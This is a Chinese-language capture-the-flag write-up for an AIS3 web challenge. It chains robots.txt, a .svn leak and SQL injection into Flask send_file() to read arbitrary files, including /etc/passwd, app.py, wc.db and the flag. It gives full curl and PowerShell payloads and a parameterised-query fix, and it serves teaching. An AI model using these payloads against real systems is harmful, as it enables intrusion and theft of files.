# AIS3 Pre-exam 2026 Web - MyGO!!!!! X Ave Mujica 圖庫 Write-up

## 題目資訊

- 題目名稱：MyGO!!!!! X Ave Mujica 圖庫
- 題目說明 1：我已經想不到要怎麼塞 MyGO 梗了，你來幫我塞
- 題目說明 2：機器人禁止
- Author：ItisCaleb
- URL：`http://chals1.ais3.org:48763/`
- Flag 格式：`AIS3{...}`

最後取得的 flag：

```text
AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}
```

## 解題總覽

這題的主要攻擊鏈如下：

1. 從題目提示「機器人禁止」想到檢查 `robots.txt`。
2. `robots.txt` 洩漏 `.svn`，暗示網站目錄裡有 Subversion metadata。
3. 首頁的圖片列表使用 `/image?id=...` 讀圖。
4. `/image?id=` 存在 SQL injection。
5. 後端查出來的欄位會直接丟給 Flask `send_file()`，因此可以用 SQL injection 達成任意檔案讀取。
6. 先讀出 `app.py` 確認漏洞，再讀 `.svn/wc.db`。
7. 從 `.svn/wc.db` 找到真正的 flag 檔名。
8. 用同一個任意檔案讀取漏洞讀出 flag。

## 畫面觀察

打開題目網站後，可以看到一個圖庫頁面：

- 頁面標題是 `MyGO!!!!! X Ave Mujica 圖庫`。
- 上方有一個圖片上傳區，可以點擊或拖曳圖片上傳。
- 下方是「圖片列表」，會載入很多圖片卡片。
- 每張圖片的 HTML 都是透過 `/image?id=數字` 載入。

從畫面可以推測，後端至少有兩個重要功能：

- `/image?id=...`：根據 id 讀取圖片。
- `/upload`：上傳圖片。

題目說「機器人禁止」，這通常會讓人想到 `robots.txt`。

## Step 1：檢查 robots.txt

使用 curl 或 PowerShell 都可以。

```bash
curl http://chals1.ais3.org:48763/robots.txt
```

回應：

```text
.svn
```

這表示網站根目錄可能存在 `.svn` 目錄。`.svn` 是 Subversion 工作目錄的 metadata，如果設定不當，可能會洩漏原始碼或歷史檔案。

直接嘗試讀取常見 SVN 檔案：

```bash
curl http://chals1.ais3.org:48763/.svn/wc.db
curl http://chals1.ais3.org:48763/.svn/entries
```

這兩個直接 HTTP 存取會失敗或 404。不過這仍然是一個很重要的方向：`.svn` 可能存在於伺服器本機，只是無法直接由靜態路由下載。

## Step 2：觀察首頁原始碼

讀取首頁：

```bash
curl http://chals1.ais3.org:48763/
```

可以在 HTML 裡看到圖片載入方式：

```html
<img class="card-img" src="/image?id=${item}"/>
```

因此下一步改測 `/image?id=`。

先讀一張圖片：

```bash
curl -i "http://chals1.ais3.org:48763/image?id=1"
```

回應標頭中會看到類似：

```text
Content-Disposition: inline; filename=haruhikage.jpg
Content-Type: image/jpeg
```

這表示後端會根據 id 找到某個檔案路徑，然後把檔案送回來。

## Step 3：測試 id 參數

先測試不存在的 id：

```bash
curl -i "http://chals1.ais3.org:48763/image?id=0"
```

結果是 `500 Internal Server Error`。

這代表後端查不到資料時沒有正確處理錯誤。

接著測試布林條件：

```bash
curl -i "http://chals1.ais3.org:48763/image?id=1%20AND%201"
curl -i "http://chals1.ais3.org:48763/image?id=1%20AND%200"
```

觀察到：

- `1 AND 1` 可以正常回傳圖片。
- `1 AND 0` 會 500。

這表示 `id` 很可能被直接拼進 SQL 查詢。

再測：

```bash
curl -i "http://chals1.ais3.org:48763/image?id=1%20ORDER%20BY%201"
curl -i "http://chals1.ais3.org:48763/image?id=1%20ORDER%20BY%202"
```

觀察到：

- `ORDER BY 1` 正常。
- `ORDER BY 2` 失敗。

所以原查詢結果只有 1 個欄位。

## Step 4：確認 SQL Injection + 任意檔案讀取

因為查詢只有 1 欄，可以使用：

```sql
0 UNION SELECT '檔案路徑'
```

如果後端會把查詢結果當成檔案路徑送進 `send_file()`，那就能讀取伺服器上的任意檔案。

先測 `/etc/passwd`：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'/etc/passwd'"
```

成功讀到：

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

這就確認了漏洞：

- `/image?id=` 有 SQL injection。
- 可以用 SQL injection 控制查詢結果。
- 查詢結果會被 Flask `send_file()` 當作檔案路徑。
- 因此可以任意檔案讀取。

## Step 5：讀取 app.py

接著讀原始碼：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'app.py'"
```

可以看到關鍵程式碼：

```python
@app.get("/image")
def image():
    image_id = request.args.get("id")
    cur = db.execute(f"SELECT path FROM images WHERE id = {image_id};").fetchone()
    return send_file(cur[0])
```

問題就在這行：

```python
db.execute(f"SELECT path FROM images WHERE id = {image_id};")
```

`image_id` 被直接塞進 SQL，造成 SQL injection。

而 `cur[0]` 又直接送給：

```python
send_file(cur[0])
```

所以只要 UNION SELECT 出想讀的檔案路徑，就能讓後端幫我們讀檔。

原始碼還可以看到：

```python
@app.get("/robots.txt")
def robot():
    return send_file("robots.txt")
```

以及：

```python
app.config['UPLOAD_FOLDER'] = "images"
```

但 flag 不在 `app.py` 裡，需要繼續利用一開始的 `.svn` 線索。

## Step 6：用 LFI 讀取 .svn/wc.db

直接從瀏覽器拿 `.svn/wc.db` 會失敗，但現在我們有任意檔案讀取，可以改用漏洞讀它：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'.svn/wc.db'" -o wc.db
```

`wc.db` 是 SVN 工作副本的 SQLite 資料庫，裡面會記錄版本控制中的檔案路徑與 checksum。

如果本機有 `sqlite3`，可以查：

```bash
sqlite3 wc.db "select local_relpath, checksum from NODES;"
```

如果沒有 `sqlite3`，也可以直接用 `strings` 找可讀字串：

```bash
strings wc.db
```

在 Windows PowerShell 沒有 `strings` 時，也可以用任意能抽 printable strings 的工具。重點是從 `wc.db` 裡找出檔名。

從 `wc.db` 可以看到一個非常可疑的檔案：

```text
super_secret_starburst_flag114514.txt
```

同時也會看到其他版本控制中的檔案，例如：

```text
app.py
robots.txt
requirements.txt
templates/index.html
static/style.css
images/haruhikage.jpg
images/yes_but_no.jpg
images/good.jpg
images/useless.jpg
```

## Step 7：讀取 flag 檔案

最後用同一個漏洞讀剛剛找到的檔案：

```bash
curl "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'super_secret_starburst_flag114514.txt'"
```

取得：

```text
AIS3{BangDream_AveMujica_Exitus_at_Taiwan_8/8_and_I_don't_have_ticket}
```

## PowerShell 復現版本

如果是在 Windows PowerShell，可以使用 `Invoke-WebRequest`：

```powershell
Invoke-WebRequest -Uri "http://chals1.ais3.org:48763/robots.txt" -UseBasicParsing
```

測試 SQL injection：

```powershell
Invoke-WebRequest -Uri "http://chals1.ais3.org:48763/image?id=1%20AND%201" -UseBasicParsing
Invoke-WebRequest -Uri "http://chals1.ais3.org:48763/image?id=1%20AND%200" -UseBasicParsing
```

讀 `app.py`：

```powershell
Invoke-WebRequest -Uri "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'app.py'" -UseBasicParsing
```

下載 `.svn/wc.db`：

```powershell
Invoke-WebRequest -Uri "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'.svn/wc.db'" -UseBasicParsing -OutFile wc.db
```

讀 flag：

```powershell
Invoke-WebRequest -Uri "http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'super_secret_starburst_flag114514.txt'" -UseBasicParsing
```

## 漏洞成因

這題核心漏洞有兩個點串在一起。

第一個是 SQL injection：

```python
cur = db.execute(f"SELECT path FROM images WHERE id = {image_id};").fetchone()
```

後端沒有把 `image_id` 當參數綁定，而是直接用 f-string 拼 SQL。

安全寫法應該類似：

```python
cur = db.execute("SELECT path FROM images WHERE id = ?;", (image_id,)).fetchone()
```

第二個是任意檔案讀取：

```python
return send_file(cur[0])
```

後端完全相信資料庫查出的路徑。當攻擊者可以用 SQL injection 控制 `cur[0]`，`send_file()` 就變成任意檔案讀取工具。

## 為什麼 .svn 很重要

`robots.txt` 回傳 `.svn` 是這題很大的提示。

`.svn/wc.db` 會記錄 SVN 工作副本中的檔案。就算 flag 檔案沒有出現在首頁或原始碼中，只要它曾經被 SVN 追蹤，檔名就可能留在 `wc.db` 裡。

本題中，`wc.db` 洩漏了：

```text
super_secret_starburst_flag114514.txt
```

因此我們不需要猜 flag 路徑，只要讀 SVN metadata 就能找到正確檔名。

## 完整攻擊鏈 Payload

確認 SQL injection：

```text
/image?id=1 AND 1
/image?id=1 AND 0
```

確認欄位數：

```text
/image?id=1 ORDER BY 1
/image?id=1 ORDER BY 2
```

任意檔案讀取：

```text
/image?id=0 UNION SELECT '/etc/passwd'
```

讀原始碼：

```text
/image?id=0 UNION SELECT 'app.py'
```

讀 SVN metadata：

```text
/image?id=0 UNION SELECT '.svn/wc.db'
```

讀 flag：

```text
/image?id=0 UNION SELECT 'super_secret_starburst_flag114514.txt'
```

URL encode 後的最終請求：

```text
http://chals1.ais3.org:48763/image?id=0%20UNION%20SELECT%20'super_secret_starburst_flag114514.txt'
```

## 總結

這題的入口提示是「機器人禁止」，對應到 `robots.txt`。`robots.txt` 洩漏 `.svn`，讓我們知道 SVN metadata 可能存在。雖然不能直接 HTTP 下載 `.svn/wc.db`，但 `/image?id=` 的 SQL injection 可以控制後端 `send_file()` 的檔案路徑，進而讀出 `.svn/wc.db`。最後從 SVN metadata 找到 `super_secret_starburst_flag114514.txt`，再用同一個任意檔案讀取漏洞取得 flag。

